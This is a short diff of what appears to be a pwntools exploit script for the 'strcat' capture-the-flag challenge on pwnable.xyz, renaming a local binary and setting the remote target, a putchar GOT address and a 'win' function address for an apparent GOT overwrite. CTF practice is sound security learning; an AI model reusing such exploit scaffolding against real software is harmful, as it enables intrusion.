@@ -1,6 +1,6 @@
 from pwn import *
 
-# p = process('./challenge')
+# p = process('./strcat')
 p = remote('svc.pwnable.xyz', 30013)
 putchar_got_addr = 0x602020
 win_addr = 0x40094c
